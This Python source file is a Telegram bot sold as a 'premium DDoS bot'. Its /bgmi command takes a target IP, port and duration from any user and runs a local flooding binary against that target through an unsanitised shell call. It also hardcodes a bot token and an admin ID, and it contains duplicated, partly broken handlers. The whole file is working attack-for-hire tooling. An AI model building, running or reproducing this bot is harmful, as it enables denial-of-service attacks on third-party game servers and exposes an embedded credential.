import telebot
import subprocess
import datetime
import os

from keep_alive import keep_alive
keep_alive()
# insert your Telegram bot token here
bot = telebot.TeleBot('8147017569:AAGp8qsOlZgEB4-cN-Ex4xyegaAJ12jkqgQ')

# Admin user IDs
admin_id = ["6684327127"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["6684327127"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    # Remove the check for allowed_user_ids
    # user_id = str(message.chat.id)
    # if user_id in allowed_user_ids:
    
    command = message.text.split()
    if len(command) == 4:
        target = command[1]
        port = int(command[2])
        time = int(command[3])
        if time > 600:
            response = "Error: Time interval must be less than 600."
        else:
            record_command_logs(user_id, '/bgmi', target, port, time)
            log_command(user_id, target, port, time)
            start_attack_reply(message, target, port, time)
            full_command = f"./bgmi {target} {port} {time} 110"
            process = subprocess.run(full_command, shell=True)
            response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
            bot.reply_to(message, response)
    else:
        response = "✅ Usage :- /bgmi <target> <port> <time>"
    bot.reply_to(message, response)


# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Command handler for retrieving user info
# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "User"  # Everyone is treated as a User now
    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}"
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) > 1:
        user_to_remove = command[1]
        # Assuming allowed_user_ids is a global variable, you may need to define it
        if user_to_remove in allowed_user_ids:
            allowed_user_ids.remove(user_to_remove)
            with open(USER_FILE, "w") as file:
                for uid in allowed_user_ids:
                    file.write(f"{uid}\n")
            response = f"User {user_to_remove} removed successfully 👍."
        else:
            response = f"User {user_to_remove} not found in the list ❌."
    else:
        response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    try:
        with open(LOG_FILE, "r+") as file:
            log_content = file.read()
            if log_content.strip() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs Cleared Successfully ✅"
    except FileNotFoundError:
        response = "Logs are already cleared ❌."
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    try:
        with open(USER_FILE, "r+") as file:
            log_content = file.read()
            if log_content.strip() == "":
                response = "USERS are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Users Cleared Successfully ✅"
    except FileNotFoundError:
        response = "Users are already cleared ❌."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    try:
        with open(USER_FILE, "r") as file:
            user_ids = file.read().splitlines()
            if user_ids:
                response = "Authorized Users:\n"
                for uid in user_ids:
                    try:
                        user_info = bot.get_chat(int(uid))
                        username = user_info.username
                        response += f"- @{username} (ID: {uid})\n"
                    except Exception as e:
                        response += f"- User ID: {uid}\n"
            else:
                response = "No data found ❌"
    except FileNotFoundError:
        response = "No data found ❌"
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        try:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        except FileNotFoundError:
            response = "No data found ❌."
            bot.reply_to(message, response)
    else:
        response = "No data found ❌"
        bot.reply_to(message, response)




# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of @venomXcrazy"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    # Check if the user is in admin_id (admins have no cooldown)
    if user_id not in admin_id:
        # Check if the user has run the command before and is still within the cooldown period
        if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
            response = "You Are On Cooldown ❌. Please Wait 10 sec Before Running The /bgmi Command Again."
            bot.reply_to(message, response)
            return
        # Update the last time the user ran the command
        bgmi_cooldown[user_id] = datetime.datetime.now()
    
    command = message.text.split()
    if len(command) == 4:  # Updated to accept target, time, and port
        target = command[1]
        port = int(command[2])  # Convert port to integer
        time = int(command[3])  # Convert time to integer
        if time > 600:
            response = "Error: Time interval must be less than 600."
        else:
            record_command_logs(user_id, '/bgmi', target, port, time)
            log_command(user_id, target, port, time)
            start_attack_reply(message, target, port, time)  # Call start_attack_reply function
            full_command = f"./bgmi {target} {port} {time} 110"
            process = subprocess.run(full_command, shell=True)
            response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
            bot.reply_to(message, response)  # Notify the user that the attack is finished
    else:
        response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax

    # Remove unauthorized access message
    bot.reply_to(message, response)






# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    
    try:
        with open(LOG_FILE, "r") as file:
            command_logs = file.readlines()
            user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
            if user_logs:
                response = "Your Command Logs:\n" + "".join(user_logs)
            else:
                response = "❌ No Command Logs Found For You ❌."
    except FileNotFoundError:
        response = "No command logs found."
        bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''🤖 Available commands:
💥 /bgmi : Method For Bgmi Servers. 
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recents Attacks.
💥 /myinfo : TO Check Your WHOLE INFO.

🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

Official Channel :- https://t.me/V3NOM_CH3AT
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɡʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
🤖Try To Run This Command : /help'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Don't Run Too Many Attacks!! Cause A Ban From Bot
2. Don't Run 2 Attacks At The Same Time Because If You Do, You Will Be Banned From The Bot.
3. MAKE SURE YOU JOINED https://t.me/venomcha7 OTHERWISE IT WILL NOT WORK
4. We Daily Check The Logs So Follow These Rules To Avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:


💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    
    command = message.text.split(maxsplit=1)
    if len(command) > 1:
        message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
        with open(USER_FILE, "r") as file:
            user_ids = file.read().splitlines()
            for user_id in user_ids:
                try:
                    bot.send_message(user_id, message_to_broadcast)
                except Exception as e:
                    print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
                    response = "Broadcast Message Sent Successfully To All Users 👍."
    else:
        response = "🤖 Please Provide A Message To Broadcast."
        bot.reply_to(message, response)

# Start the bot's polling loop
#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)

